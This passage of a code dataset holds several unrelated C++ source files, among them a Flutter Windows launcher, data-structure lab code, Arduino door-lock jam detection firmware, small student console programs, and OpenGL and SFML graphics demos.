number.\\n\");\n        }\n    } catch (const std::string &error) {\n        std::cout << \"Error!!!:\\n ***\" << error << std::endl;\n        throw; // Rethrow the exception to be caught in the calling context\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"s_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <cstdlib>\n#include<time.h>\n#include<iostream>\n#include<list>\n#include<fstream>\n#include<set>\n\n#include \"gtest.h\"\n#include\"TSortTable.h\"\n#include\"TArrayHash.h\"\n#include\"TListHash.h\"\n#include\"TTreeTable.h\"\n#include\"TBalTreeTable.h\"\n\n\n//#define TESTS\n\n#ifdef TESTS\nint main(int argc, char** argv)\n{\n\t::testing::InitGoogleTest(&argc, argv);\n\treturn RUN_ALL_TESTS();\n}\n#endif \n\n#ifndef TESTS\n\nint main()\n{\n\tTScanTable <int, int> t1(1000);\n\tTSortTable <int, int> t2(1000);\n\tTArrayHash<int, int> t3(1000, 3);\n\tTListHash<int, int> t4(1000);\n\tTTreeTable<int, int> t5;\n\tTBalTreeTable<int, int>t6;\n\tstd::set<int> s;\n\t/*for (int i = 0; i < 100; i++) {\n\t\tint r = i*11;\n\t\tTRecord<int, int>rec(r, i);\n\t\tt3.insert(rec);\n\t}\n\tt3.Delete(44);\n\tt3.Delete(88);\n\tt3.clearEfficiency();\n\tint e = t3.find(110);\n\tint eff = t3.getEfficiency();\n\tstd::cout <<\"res of find \"<< e<<'\\n'<<\"eff of find \"<<eff;*/\n\t/*TRecord<int, int>rec(10,1);\n\tt6.insert(rec);\n\tTRecord<int, int>rec1(5, 2);\n\tt6.insert(rec1);\n\tTRecord<int, int>rec2(15, 3);\n\tt6.insert(rec2);\n\tTRecord<int, int>rec3(3, 4);\n\tt6.insert(rec3);\n\tTRecord<int, int>rec4(6, 5);\n\tt6.insert(rec4);\n\tTRecord<int, int>rec5(20, 6);\n\tt6.insert(rec5);\n\tTRecord<int, int>rec6(17, 7);\n\tt6.insert(rec6);\n\tt6.output();\n\tTRecord<int, int>rec7(16, 8);\n\tt6.insert(rec7);*/\n\tsrand(time(NULL));\n\tfor (int i = 0; i < 1000; i++) {\n\t\tint r = i;\n\t\tTRecord<int, int>rec(r, i);\n\t\tbool w = s.count(rec.key);\n\t\twhile (w) {\n\t\t\trec.key = rand();\n\t\t\tw = s.count(rec.key);\n\t\t}\n\t\ts.insert(rec.key);\n\t\tt1.insert(rec);\n\t\tt2.insert(rec);\n\t\tt3.insert(rec);\n\t\tt4.insert(rec);\n\t\tt5.insert(rec);\n\t\tt6.insert(rec);\n\t}\n\tt5.clearEfficiency();\n\tt6.clearEfficiency();\n\tt6.Delete(511);\n\tt5.Delete(511);\n\t//t1.clearEfficiency();\n\t//t2.clearEfficiency();\n\t//t3.clearEfficiency();\n\t//t4.clearEfficiency();\n\t//t5.clearEfficiency();\n\t//t6.clearEfficiency();\n\t//t1.find(10000);\n\t//t2.find(10000);\n\t//t3.find(10000);\n\t//t4.find(10000);\n\t//t5.find(10000);\n\t//t6.find(10000);\n\n\n\tstd::ofstream fs, fs1;\n\tfs.open(\"D:/study/yaziki_i_metodi/git_labs/table/data.txt\");\n\tfs1.open(\"D:/study/yaziki_i_metodi/git_labs/table/data1.txt\");\n\t//fs << t4;\n\tt5.output(fs);\n\tt6.output(fs1);\n\tfs.close();\n\tfs1.close();\n\t//std::cout << \"\\n efficiency scan = \"<< t1.getEfficiency();\n\t//std::cout << \"\\n efficiency sort = \" << t2.getEfficiency();\n\t//std::cout << \"\\n efficiency hash array = \" << t3.getEfficiency();\n\t//std::cout << \"\\n efficiency hash list = \" <<t4.getEfficiency();\n\tstd::cout << \"\\n efficiency tree tab = \" << t5.getEfficiency();\n\tstd::cout << \"\\n efficiency bal tree = \" << t6.getEfficiency();\n\t\n}\n#endif // !TESTS\n\n",
    "/*\nRuggedPaxCompanion Copyright 2024 Michael Caldwell-Waller (@chipguyhere), License: GPLv3\n\nThis program is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n#include \"Arduino.h\"\n#include \"RuggedPax.h\"\n\n\n\n\n\nstatic int currentReadingCount=0;\nstatic byte currentReadings[1024];\nstatic int histogram[256];\nstatic int comsam = 0;\nstatic uint16_t current_sensor_zero_point = 512;\n\n\nconstexpr int lockedinfo_size=16;\nstatic int lockedinfo[lockedinfo_size];\nstatic int lockedsamples=0;\n\nbool currentSensing::feature_enabled=false;\n\ndisplayPage lockDisplayPage;\nchar lockStatus[30]=\"\";\n\n\nstatic void currentSensing::setup() {\n  if (eepromconfig::get_current_sensing_option() != 91) {\n    // CURRENT SENSING IS NOT ENABLED so don't initialize.\n    return;\n  }\n\n  currentSensing::feature_enabled=true;\n\n  lockDisplayPage.rommsg = PSTR(\"SDC 1091 jam detect:\\n\");\n  addDisplayPage(&lockDisplayPage);\n  lockDisplayPage.msg = lockStatus;\n\n  current_sensor_zero_point = eepromconfig::get_current_sensor_zero_point();\n\n}\n\n\nstatic void currentSensing::loop() {\n  if (!currentSensing::feature_enabled) return;\n\n\n  long m = millis();\n  static long lastCurrentReading;\n\n  // Read the Current (Amps) from the current sensor, and put it in the currentReadings array.\n  if (m - lastCurrentReading >= 1) {\n    lastCurrentReading = m;\n    long currentReading = analogRead(CURRENT_SENSE_INPUT);\n    // APPLY ANY ADJUSTMENT ALGORITHM HERE\n    currentReading -= current_sensor_zero_point;\n    /*\n    float fcr = currentReading;\n    if (fcr < 0) fcr=-fcr;\n    int z = (currentReading < 0) ? -currentReading : currentReading;\n    if (fcr > 22) fcr = pow(fcr, 1.3);\n    currentReading = fcr;\n    if (z < 20) {\n      Serial.print('.');\n    } else if (z >= 15 && z < (15+36)) {\n      Serial.print(\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"[z-15]);\n    } else {\n      Serial.print('#');\n    }\n    //long z = currentReading * currentReading;\n    //int z = fcr;\n    //for (int zz=0; zz<sizeof(syms); zz++) {\n    //  if (z < thresholds[zz] || thresholds[zz]==0) {\n    //    Serial.print(syms[zz]);\n    //    break;\n    //  }\n    //}\n    if ((currentReadingCount % 120) == 0) Serial.println();\n*/\n    if (currentReading < 0) currentReading = -currentReading;\n    if (currentReading > 255) currentReading=255;\n\n    int idx = currentReadingCount % sizeof(currentReadings);\n    if (currentReadingCount >= sizeof(currentReadings)) histogram[currentReadings[idx]]--;\n    histogram[currentReading]++;\n    currentReadings[idx] = currentReading;\n    currentReadingCount++;\n    if (currentReadingCount >= sizeof(currentReadings)*2) currentReadingCount = sizeof(currentReadings);\n  }\n\n  static int responsesshown=0;\n  static long lastHistoAnalysis;\n  if ((m - lastHistoAnalysis) > 500) {\n    lastHistoAnalysis = m;\n\n    long tt=0;\n    for (int i=30; i<256; i++) tt += histogram[i];\n \n    int peakI=0;\n    int peakIval=1;\n    int sampleTotal=0;\n    for (int i=10; i<30; i++) {\n      int vv = histogram[i];\n      sampleTotal += vv;\n      vv += histogram[i+1];\n      vv += histogram[i-1];\n\n      if (vv > peakIval) peakIval=vv,peakI=i;\n    }\n    for (int i=30; i<255; i++) sampleTotal += histogram[i];\n\n    // if there's significant current flowing at least (200/1024) or 20% of the time, consider the door locked.\n    if (sampleTotal > 200) believedLocked=true; else believedLocked=false;\n    if (believedLockedValid==false && m > 3000) believedLockedValid=true;\n\n    // Compare the sample count at three quarters of the peak to the sample count at the top of the peak.\n    // If the lock is jammed, we'll get to the peak quicker, and there will be fewer samples at the 3/4 mark.\n    int fractionofI = peakI * 3 / 4;\n    int comparativeSample = histogram[fractionofI];\n    comparativeSample += histogram[fractionofI+1];\n    comsam = comparativeSample * 100 / peakIval;\n\n    if (believedLocked==false) {\n      lockedsamples=0;\n    } else {\n      lockedinfo[lockedsamples % lockedinfo_size]=comsam;\n      lockedsamples++;\n      if (lockedsamples>=lockedinfo_size*2) lockedsamples=lockedinfo_size;\n    }\n\n    if (lockedsamples < lockedinfo_size) {\n      believedJammed=false;\n    } else {\n      long avgI=0;\n      for (int i=0; i<lockedinfo_size; i++) avgI += lockedinfo[i];\n      avgI /= lockedinfo_size;\n      believedJammed = (avgI < 25);\n    }\n\n    if (believedLocked) {\n      Serial.print(F(\"Locked n=\"));\n      Serial.print(comsam);\n      Serial.println(F(\"%\"));\n    }\n  }\n\n  m = millis();\n  static l",
    "\ufeff#include <iostream>\n#include <string>\n\n\nclass Counter {\n\n    int number = 1;\n    std::string command;\npublic:\n    void setNumber(int number) { this->number = number; }\n    void setCommand(std::string q) { command = q; }\n    std::string getCommand() { return command; }\n    int getNumber() { return number; }\n\n    void change() { \n    if (command == \"+\")\n        ++number;\n    if (command == \"-\")\n        --number;\n    \n    }\n    \n\n};\n\n\nint main() {\n    setlocale(LC_ALL, \"Russian\");\n\n    Counter z;\n    std::string answer;\n    std::string q;\n\n    std::cout << \"\u0412\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u0443\u043a\u0430\u0437\u0430\u0442\u044c \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0441\u0447\u0451\u0442\u0447\u0438\u043a\u0430? \u0412\u0432\u0435\u0434\u0438\u0442\u0435 yes \u0438\u043b\u0438 no: \";\n    std::cin >> answer;\n\n    if (answer == \"yes\") {\n        int number;\n        std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0441\u0447\u0451\u0442\u0447\u0438\u043a\u0430: \";\n        std::cin >> number;\n        z.setNumber(number);\n    }\n    \n    do  {\n        \n        std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043c\u0430\u043d\u0434\u0443 ('+', '-', '=' \u0438\u043b\u0438 'x'): \";\n        std::cin >> q;\n\n        z.setCommand(q);\n        \n        z.change();\n        if ((z.getCommand()) == \"=\") {\n            std::cout << z.getNumber() << std::endl;\n        }\n        \n\n    } while ((z.getCommand()) != \"x\");\n\n    std::cout << \"\u0414\u043e \u0441\u0432\u0438\u0434\u0430\u043d\u0438\u044f!\";\n\n    return 0;\n}",
    "//MUHAMMAD IRSYAD\n//2211102048\n#include <iostream>\n\nusing namespace std;\nstruct saham\n{\n    string ns;\n    int hs;\n};\n\nint main()\n{\n    saham a;\n    saham b;\n    int uang;\n    cout << \"Masukkan nama saham 1 : \";\n    cin >> a.ns;\n    cout << \"Masukkan harga saham 1 : \";\n    cin >> a.hs;\n    cout << \"Masukkan nama saham 2 : \";\n    cin >> b.ns;\n    cout << \"Masukkan harga saham 2 : \";\n    cin >> b.hs;\n\n    cout << \"Nama saham 1 : \" << a.ns << endl;\n    cout << \"Harga lembar Saham 1: \" << a.hs << endl;\n    cout << \"Nama saham 2 : \" << b.ns << endl;\n    cout << \"Harga lembar Saham 2: \" << b.hs << endl;\n    int pilih;\n    do\n    {\n        cout << \"Pilih saham yang mau anda beli : \";\n        cin >> pilih;\n\n        switch (pilih)\n        {\n        case 1:{\n            cout << \"Masukkan Jumlah uang : \";\n            cin >> uang;\n            do\n            {\n                if (uang>a.hs * 100)\n            {\n                cout << \"Dengan Modal Rp.\" << uang << \" anda dapat membeli \" << uang / (a.hs * 100) << \" LOT saham \" << a.ns << endl;\n            cout << \"Sisa Modal anda Rp.\" << uang - ((uang / (a.hs * 100)) * (a.hs * 100)) << endl;\n            }else\n            {\n                cout << \"Uang yang anda masukkan kurang\";\n            }\n            } while (uang > a.hs * 100);\n\n            break;\n        }\n        case 2:{\n            cout << \"Masukkan Jumlah uang : \";\n            cin >> uang;\n            do\n            {\n                if (uang>b.hs * 100)\n            {\n                cout << \"Dengan Modal Rp.\" << uang << \" anda dapat membeli \" << uang / (b.hs * 100) << \" LOT saham \" << b.ns << endl;\n            cout << \"Sisa Modal anda Rp.\" << uang - ((uang / (b.hs * 100)) * (b.hs * 100)) << endl;\n            }else\n            {\n                cout << \"Uang yang anda masukkan kurang\";\n            }\n            } while (uang > b.hs * 100);\n\n            break;\n        }\n        }\n    } while (pilih = 0);\n}",
    "#include <windows.h>\r\n#include <string>\r\n#include <iostream>\r\n#include <stdlib.h>\r\n#include <time.h>\r\n\r\n#ifdef __APPLE__\r\n#include <GLUT/glut.h>\r\n#else\r\n#include <GL/glut.h>\r\n#endif\r\n\r\nusing namespace std;\r\n\r\nbool play = true;\r\nfloat x_play_p1 = 0.0;\r\nfloat x_play_p2 = 0.0;\r\n\r\nfloat y_play_p1 = 0.0;\r\nfloat y_play_p2 = 0.0;\r\n\r\nint temp_p1_past = 1;\r\nint temp_p1_future = 1;\r\n\r\nint temp_p2_past = 1;\r\nint temp_p2_future = 1;\r\n\r\nbool x_play1 = true;\r\nbool x_play2 = true;\r\n\r\nfloat nilai_x1_p1 = -1.75;\r\nfloat nilai_x2_p1 = -1.65;\r\n\r\nfloat x1_p2 = 0.42;\r\n\r\nfloat nilai_x1_p2 = -1.7;\r\nfloat nilai_x2_p2 = -1.65;\r\nfloat nilai_x3_p2 = -1.75;\r\n\r\nbool dimensi3 = false;\r\n\r\nint krotated = 1;\r\nint irotated = 1;\r\nint jrotated = 1;\r\nint lrotated = 1;\r\n\r\nfloat x1_observer = -1.6;\r\nfloat x2_observer = -1.5;\r\n\r\nfloat y1_observer = -1.6;\r\nfloat y2_observer = -1.76;\r\n\r\n\r\nvoid display3D() {\r\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\r\n    glPointSize(4);\r\n    glLoadIdentity();\r\n    glEnable(GL_DEPTH_TEST);\r\n\r\n    float color1[] = {0.0, 0.0, 0.0, 0.5};\r\n    float color2[] = {0.0, 0.0, 1.0, 0.5};\r\n    float color3[] = {0.5, 0.5, 0.5};\r\n    float color4[] = {1.0, 0.0, 0.0};\r\n    float color5[] = {0.0, 1.0, 0.0};\r\n    float color6[] = {0.5, 0.0, 0.5};\r\n    float color7[] = {1.0, 0.647, 0.0};\r\n    float color8[] = {0.647, 0.164, 0.164};\r\n\r\n    //-2 = 1\r\n    // 2 = 0\r\n\r\n\r\n\r\n    glRotated(-(krotated), -1, 0, 0);\r\n    glRotated((irotated), 1, 0, 0);\r\n    glRotated(-(jrotated), 0, -1, 0);\r\n    glRotated((lrotated), 0, 1, 0);\r\n\r\n    glClearColor(0.0, 1.0, 0.0, 0.0);\r\n\r\n\r\n    //angka 8\r\n\r\n    //belakang\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.78, 0.0);\r\n    glVertex3f(1.78,1.78, 0.0);\r\n    glVertex3f(1.78,1.76, 0.0);\r\n    glVertex3f(1.72,1.76, 0.0);\r\n    glEnd();\r\n\r\n    //depan\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.78, -0.1);\r\n    glVertex3f(1.78,1.78, -0.1);\r\n    glVertex3f(1.78,1.76, -0.1);\r\n    glVertex3f(1.72,1.76, -0.1);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.78, 0.0);\r\n    glVertex3f(1.72,1.78, -0.1);\r\n    glVertex3f(1.72,1.76, -0.1);\r\n    glVertex3f(1.72,1.76, 0.0);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.78,1.78, 0.0);\r\n    glVertex3f(1.78,1.78, -0.1);\r\n    glVertex3f(1.78,1.76, -0.1);\r\n    glVertex3f(1.78,1.76, 0.0);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.78, 0.0);\r\n    glVertex3f(1.78,1.78, 0.0);\r\n    glVertex3f(1.72,1.78, -0.1);\r\n    glVertex3f(1.78,1.78, -0.1);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.78,1.76, 0.0);\r\n    glVertex3f(1.72,1.76, 0.0);\r\n    glVertex3f(1.78,1.76, -0.1);\r\n    glVertex3f(1.72,1.76, -0.1);\r\n    glEnd();\r\n\r\n\r\n\r\n    //belakang\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.78, 0.0);\r\n    glVertex3f(1.74,1.78, 0.0);\r\n    glVertex3f(1.74,1.67, 0.0);\r\n    glVertex3f(1.72,1.67, 0.0);\r\n    glEnd();\r\n\r\n    //depan\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.78, -0.1);\r\n    glVertex3f(1.74,1.78, -0.1);\r\n    glVertex3f(1.74,1.67, -0.1);\r\n    glVertex3f(1.72,1.67, -0.1);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.78, 0.0);\r\n    glVertex3f(1.72,1.78, -0.1);\r\n    glVertex3f(1.72,1.67, -0.1);\r\n    glVertex3f(1.72,1.67, 0.0);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.74,1.78, 0.0);\r\n    glVertex3f(1.74,1.78, -0.1);\r\n    glVertex3f(1.74,1.67, -0.1);\r\n    glVertex3f(1.74,1.67, 0.0);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.78, 0.0);\r\n    glVertex3f(1.74,1.78, 0.0);\r\n    glVertex3f(1.72,1.78, -0.1);\r\n    glVertex3f(1.74,1.78, -0.1);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.74,1.67, 0.0);\r\n    glVertex3f(1.72,1.67, 0.0);\r\n    glVertex3f(1.74,1.67, -0.1);\r\n    glVertex3f(1.72,1.67, -0.1);\r\n    glEnd();\r\n\r\n\r\n\r\n    //belakang\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.73, 0.0);\r\n    glVertex3f(1.78,1.73, 0.0);\r\n    glVertex3f(1.78,1.71, 0.0);\r\n    glVertex3f(1.72,1.71, 0.0);\r\n    glEnd();\r\n\r\n    //depan\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.73, -0.1);\r\n    glVertex3f(1.78,1.73, -0.1);\r\n    glVertex3f(1.78,1.71, -0.1);\r\n    glVertex3f(1.72,1.71, -0.1);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.72,1.73, 0.0);\r\n    glVertex3f(1.72,1.73, -0.1);\r\n    glVertex3f(1.72,1.71, -0.1);\r\n    glVertex3f(1.72,1.71, 0.0);\r\n    glEnd();\r\n\r\n    glColor3f(1.0, 1.0, 1.0);\r\n    glBegin(GL_POLYGON);\r\n    glVertex3f(1.78,1.73, 0.0);\r\n    glVertex3f(1.78,1.73, -0.1);\r\n    glVertex3f(1.78,1.71, -0.1);\r\n    glVertex3f(1.78,1.71, 0.0);\r\n    glEnd();\r\n\r\n ",
    "#include \"Game.h\"\n#include \"spdlog/spdlog.h\"\n#include \"Animation\\AnimationActor.h\"\n#include \"..\\Animation\\AnimationSequence.h\"\n#include \"..\\Animation\\SpriteAnimationClip.h\"\n#include \"..\\Tools\\SFMLTool.h\"\n#include \"..\\Tools\\GameLog.h\"\n#include \"..\\Tools\\TextureParser.h\"\n\nGame::Game():\nm_windowTitle(\"Default Game\"),\nm_windowWidth(800),\nm_windowHeight(600)\n{\n    m_window = new sf::RenderWindow(sf::VideoMode(m_windowWidth, m_windowHeight), m_windowTitle);\n    m_windowResolution.x = m_windowWidth;\n    m_windowResolution.y = m_windowHeight;\n}\n\nGame::Game(const std::string windowTitle, const unsigned windowWidth, const unsigned windowHeight)\n{\n    m_windowTitle = windowTitle;\n    m_windowWidth = windowWidth;\n    m_windowHeight = windowHeight;\n    \n    m_window = new sf::RenderWindow(sf::VideoMode(m_windowWidth, m_windowHeight), m_windowTitle);\n    m_windowResolution.x = m_windowWidth;\n    m_windowResolution.y = m_windowHeight;\n}\n\nGame::Game(const std::string windowTitle, const unsigned windowWidth, const unsigned windowHeight,\n    const std::string iconPath)\n{\n    m_windowTitle = windowTitle;\n    m_windowWidth = windowWidth;\n    m_windowHeight = windowHeight;\n\n    m_icon = new sf::Image();\n    \n    if (!m_icon->loadFromFile(iconPath))\n    {\n        SPDLOG_ERROR(\"Failed to load icon from file\");\n        LOG_GAME(spdlog::level::err, \"Failed to load icon from file\");\n    }\n    \n    m_window = new sf::RenderWindow(sf::VideoMode(m_windowWidth, m_windowHeight), m_windowTitle);\n    m_window->setIcon(m_icon->getSize().x, m_icon->getSize().y, m_icon->getPixelsPtr());\n    m_windowResolution.x = m_windowWidth;\n    m_windowResolution.y = m_windowHeight;\n}\n\nGame::~Game()\n{\n    delete m_window;\n\n    if (m_icon!= nullptr)\n    {\n        delete m_icon;\n    }\n\n\n}\n\nvoid Game::runLoop()\n{\n    if (m_window == nullptr)\n    {\n        SPDLOG_ERROR(\"No Render window is created\");\n        LOG_GAME(spdlog::level::err, \"No Render window is created\");\n        return;\n    }\n    \n    LOG_GAME(spdlog::level::info, \"Game loop started\");\n\n    //----------------DEBUG CODE----------------\n    \n    m_animationActor = new AnimationActor(sf::Vector2f(m_windowWidth / 2, m_windowHeight / 2));\n    AnimationSequence* sequence = m_animationActor->createAnimationSequence();\n\n    sf::Sprite sprite_bg;\n    sf::Texture texture_bg;\n    loadAndSetSprite(sprite_bg, texture_bg, \"Resource/images/cutscenes/intro_bg.png\");\n    sprite_bg.setPosition(sf::Vector2f(m_windowWidth / 2, m_windowHeight / 2));\n    sprite_bg.setScale(sf::Vector2f(3.f, 3.f));\n    AlignedCenterSprite(sprite_bg);\n        \n    sf::Sprite sprite;\n    sf::Texture texture;\n    sf::Sprite sprite1;\n    \n    loadAndSetSprite(sprite, texture, \"Resource/images/cutscenes/intro1.png\");\n    \n    TextureParser textureParser(\"Resource/images/cutscenes/intro1.json\", sprite);\n    \n    sprite.setTextureRect(textureParser.GetDataByName(\"intro1_6\"));\n    AlignedCenterSprite(sprite);\n    sprite.setScale(sf::Vector2f(2.f, 2.f));\n    sprite.setPosition(sf::Vector2f(m_windowWidth / 2, m_windowHeight / 2));\n    \n    //loadAndSetSprite(sprite1, texture, \"Resource/images/cutscenes/intro1.png\");\n    sprite1.setTexture(texture);\n    sprite1.setTextureRect(textureParser.GetDataByName(\"intro1_7\"));\n    AlignedCenterSprite(sprite1);\n    sprite1.setScale(sf::Vector2f(2.f, 2.f));\n    sprite1.setPosition(sf::Vector2f(m_windowWidth / 2, m_windowHeight / 2));\n    \n    sequence->addClip(std::make_unique<SpriteAnimationClip>(&sprite, 0.1f));\n    sequence->addClip(std::make_unique<SpriteAnimationClip>(&sprite1, 0.1f));\n    m_animationActor->playAnimation(true);\n    \n    //---------------END DEBUG CODE-------------\n    while (m_window->isOpen())\n    {\n        deltaTime = m_TickClock.restart();\n\n        handleEventsTick(deltaTime);\n        updateTick(deltaTime);\n        m_window->clear();\n        m_window->draw(sprite_bg);\n        renderTick(deltaTime);\n    }\n\n    LOG_GAME(spdlog::level::info, \"Game loop ended\");\n}\n\nvoid Game::renderTick(sf::Time deltaTime)\n{\n    //m_window->clear();\n    m_animationActor->render(*m_window);\n    m_window->display();\n}\n\nvoid Game::updateTick(sf::Time deltaTime)\n{\n    m_animationActor->update(deltaTime);\n}\n\nvoid Game::handleEventsTick(sf::Time deltaTime)\n{\n    sf::Event event;\n\n    while (m_window->pollEvent(event))\n    {\n        switch (event.type)\n        {\n        case sf::Event::Closed:\n            m_window->close();\n            break;\n        default:\n            break;\n        }\n    }\n}\n\nsf::RenderWindow* Game::GetWindow() const\n{\n    return m_window;\n}\n\nstd::string Game::GetWindowTitle() const\n{\n    return m_windowTitle;\n}\n\nunsigned Game::GetWindowWidth() const\n{\n    return m_windowWidth;\n}\n\nunsigned Game::GetWindowHeight() const\n{\n    return m_windowHeight;\n}\n\nsf::Time Game::GetDeltaTime() const\n{\n    return deltaTime;\n}\n\nsf::Vector2u Game::GetWindowResolution() const\n{\n    return m_windowResolution;\n}\n",
    "//\n// Created by msullivan on 5/31/24.\n//\n\n#include <iostream>\n#include <complex>\n#include <cstring>\n#include <thread>\n\n#include <GL/glew.h>\n#include <GLFW/glfw3.h>\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n\n\n// Window dimensions\nconst unsigned int WIDTH = 640, HEIGHT = 480;\n\n// IDs for VAO, VBO, and shader objects\nunsigned int vao, vbo, shader;\n\n// Uniform variables\nunsigned int uniformModel;\nbool direction = true;\nfloat triOffset = 0.0f, triMaxOffset = 1.0f, triTranslationIncrement = 0.015f;\n\n// Angle stuff\nfloat currentAngle = 0.0f;\n\n// Vertex shader\nstatic const char* vertexShader =\n        \"#version 330\\n\"\n        \"\\n\"\n        \"layout (location = 0) in vec3 pos;\\n\"                  /* Note: 'pos' is a built-in variable in OpenGL */\n        \"uniform mat4 model;\\n\"\n        \"\\n\"\n        \"out vec4 vertexColor;\\n\"\n        \"\\n\"\n        \"void main()\\n\"\n        \"{\\n\"\n        \"   gl_Position = model * vec4(pos.x, pos.y, pos.z, 1.0);\\n\"    /* Note: 'gl_Position' is also built-in */\n        \"   vertexColor = vec4(clamp(pos, 0.0f, 1.0f), 1.0f);\\n\"        /* Note: 'clamp()' keeps values in a specified range */\n        \"}\\n\";\n\n// Fragment shader\nstatic const char* fragmentShader =\n        \"#version 330\\n\"\n        \"\\n\"\n        \"in vec4 vertexColor;\\n\"\n        \"\\n\"\n        \"out vec4 color;\\n\"                                     /* Note: color is built-in */\n        \"\\n\"\n        \"void main()\\n\"\n        \"{\\n\"\n        \"   color = vertexColor;\\n\"\n        \"}\\n\";\n\nvoid createTriangle()\n{\n    // Create vertex coordinates\n    float vertices[] = {\n            -1.0f, -1.0f, 0.0f,\n            0.0f, 1.0f, 0.0f,\n            1.0f, -1.0f, 0.0f\n    };\n\n    // Generate and bind VAO\n    glGenVertexArrays(1, &vao);\n    glBindVertexArray(vao);\n\n    // Generate, bind, and buffer VBO\n    glGenBuffers(1, &vbo);\n    glBindBuffer(GL_ARRAY_BUFFER, vbo);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n\n    /* index: Which vertex in buffer\n     * size: Number of elements in buffer\n     * type: Data type\n     * normalized: If 0.0-0.1, then it is already normalized; if 0-255, then it is NOT normalized (I think)\n     * stride: How many elements to skip\n     * pointer: Where to start\n     */\n    glVertexAttribPointer(0, 3, GL_FLOAT, false, 0, nullptr);\n    glEnableVertexAttribArray(0);\n\n    glBindBuffer(GL_ARRAY_BUFFER, 0);\n\n    glBindVertexArray(0);\n}\n\nvoid addShader(unsigned int program, const char* source, GLenum type)\n{\n    unsigned int newShader = glCreateShader(type);\n    const char* theCode[1];\n    theCode[0] = source;\n\n    int codeLength[1];\n    codeLength[0] = (int) strlen(source);\n\n    /* shader: Shader ID\n     * count: # of shaders being created (I think)\n     * string: Source code\n     * length: Length of source code\n     */\n    glShaderSource(newShader, 1, theCode, codeLength);\n    glCompileShader(newShader);\n\n    int result = 0;\n    char errorLog[1024] = {};\n\n    glGetShaderiv(newShader, GL_COMPILE_STATUS, &result);\n\n    if (!result)\n    {\n        glGetShaderInfoLog(newShader, sizeof(errorLog), nullptr, errorLog);\n        std::cout << \"Error compiling the \" << type << \" shader: \" << errorLog << '\\n';\n        return;\n    }\n\n    // Attach new shader to the program\n    glAttachShader(program, newShader);\n}\n\nvoid 